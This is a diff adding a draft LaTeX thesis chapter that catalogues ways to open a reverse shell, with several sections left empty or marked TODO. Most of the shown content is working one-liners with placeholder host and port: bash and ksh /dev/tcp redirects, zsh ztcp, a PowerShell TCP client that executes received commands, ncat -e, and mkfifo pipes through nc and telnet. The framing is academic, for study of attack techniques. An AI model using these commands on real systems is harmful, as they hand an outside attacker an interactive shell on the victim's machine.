@@ -1,0 +1,118 @@
+\chapter{Methods of establishing a reverse shell}
+
+\label{chap:methods}
+
+In this chapter, we go through known methods and techniques of initializing a reverse shell from a remote server. Each method is characterized by a system tool, software, or a programming language with its interpreter/compiler (meaning they are not characterized by a concrete vulnerability in the security of the target). For each method, we show an actual example of how to run the tool/software, taking into account the testing environment described at the beginning of this chapter. Furthermore, we list all dependencies of the shown example, which are effectively minimal system requirements needed for a given method.
+
+\section{Commands syntax and glossary}
+
+\TODO{here should be explained what do keywords <SHELL>, <HOST>, <PORT> mean and so on}
+
+
+\section{Command-line interpreters}
+
+
+\subsection{Bash (\texttt{bash})}
+
+\begin{cmdline}{bash}{|}{bash}{}
+bash -c '|\shell| >& /dev/tcp/|\host|/|\port| 0>&1'
+\end{cmdline}
+
+\begin{cmdline}{bash}{|}{bash}{}
+bash -c 'exec 3<>/dev/tcp/|\host|/|\port|; 0<&3; |\shell| <&3 >&3 2>&3'
+\end{cmdline}
+
+\begin{cmdline}{bash}{^}{bash}{}
+bash -c 'exec 3<>/dev/tcp/^\host^/^\port^; cat <&3 | while read line; do $line 2>&3 >&3; done'
+\end{cmdline}
+%$
+\dpd{\texttt{cat}}
+
+
+\subsection{KornShell (\texttt{ksh}/\texttt{ksh93})}
+
+\begin{cmdline}{bash}{|}{ksh}{}
+ksh -c '|\shell| > /dev/tcp/|\host|/|\port| 2>&1 0>&1'
+\end{cmdline}
+\notte{Support for network communication is a feature of the \texttt{ksh93} version of KornShell. The command won't work on \texttt{pdksh} shell.}
+
+
+\subsection{Z shell (\texttt{zsh})}
+
+\begin{cmdline}{bash}{|}{}{}
+|\textcolor{highlight}{zsh}| -c 'zmodload zsh/net/tcp; ztcp -d 3 |\host| |\port|; |\shell| 0<&3 1>&3 2>&3'
+\end{cmdline}
+\dpd{\texttt{zsh/net/tcp.so} \footnote{usually located somewhere in \texttt{/usr/lib/}}}
+
+
+\subsection{Scheme shell (\texttt{scsh})}
+
+
+\subsection{PowerShell (\texttt{powershell}/\texttt{pwsh})}
+
+\begin{cmdline}{bash}{|}{pwsh}{}
+pwsh -c '$TCPClient = New-Object Net.Sockets.TCPClient(|\host|, |\port|); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
+\end{cmdline}
+
+\dpd{\texttt{pwsh.dll} \footnote{usually located in \texttt{/opt/microsoft/powershell/}}, .NET}
+
+
+\subsection{Shells without native network support}
+
+%\textit{Bourne shell} (\texttt{sh}) was a standard shell for the Version 7 Unix system but has been replaced by its advanced variants. On most modern Unix-like distributions, the original binary \texttt{/bin/sh} is just a link to another compatible shell. However, the POSIX specification for \texttt{sh} \cite{posix_sh} does not include built-in support for creating network connections; therefore, \texttt{sh} alone shouldn't be capable of spawning a reverse shell. Similarly, standard implementations of the \textit{Almquist shell} (\texttt{ash}) and the \textit{Debian Almquist shell} (\texttt{dash}) can also not use the network.
+
+\begin{itemize}
+\item Bourne shell (\texttt{sh}) -- standard shell for the Version 7 Unix system but has been replaced by its advanced variants; on most modern Unix-like distributions, the original binary \texttt{/bin/sh} is just a link to another compatible shell
+\item Almquist shell (\texttt{ash}) and Debian Almquist shell (\texttt{dash})
+\item C shell (\texttt{csh}) and TENEX C shell (\texttt{tcsh})
+\item Friendly interactive shell (\texttt{fish})
+\item rc shell (\texttt{rc})
+\item Stand-alone shell (\texttt{sash})
+\item Command Prompt (\texttt{cmd})
+\end{itemize}
+
+
+\section{Network tools}
+
+\subsection{NetCat (\texttt{ncat}/\texttt{nc})}
+
+\TODO{explain difference between \texttt{ncat} and \texttt{nc} and why one of them may not work on some systems}
+
+\begin{cmdline}{bash}{|}{ncat}{}
+ncat -e |\shell| |\host| |\port|
+\end{cmdline}
+\notte{Standard error output of executed commands is not redirected to the socket. Option \texttt{-c} (\texttt{-{}-sh-exec}) can be used instead of \texttt{-e} with the same syntax, but \texttt{/bin/sh} is needed in that case.}
+
+\begin{cmdline}{bash}{^}{mkfifo,cat,nc}{}
+mkfifo ^\file^; cat ^\file^ | ^\shell^ 2>&1 | nc ^\host^ ^\port^ >^\file^
+\end{cmdline}
+\dpd{\texttt{mkfifo}, \texttt{cat}}
+
+\subsection{Telnet}
+
+\begin{cmdline}{bash}{^}{telnet}{}
+telnet ^\host^ ^\port^ | ^\shell^ 2>&1 | telnet ^\host^ ^\portt^
+\end{cmdline}
+\notte{The socket with port number \port serves as standard input while the socket with port number \portt serves as standard output and standard error output.}
+
+\begin{cmdline}{bash}{^}{mkfifo,cat,telnet}{}
+mkfifo ^\file^; cat ^\file^ | ^\shell^ 2>&1 | telnet ^\host^ ^\port^ >^\file^
+\end{cmdline}
+\dpd{\texttt{mkfifo}, \texttt{cat}}
+
+\subsection{OpenSSL}
+
+
+\section{Programming languages interpreters}
+
+\subsection{Python}
+
+\subsection{Perl}
+
+\subsection{PHP}
+
+\subsection{Ruby}
+
+
+\section{Other tools}
+
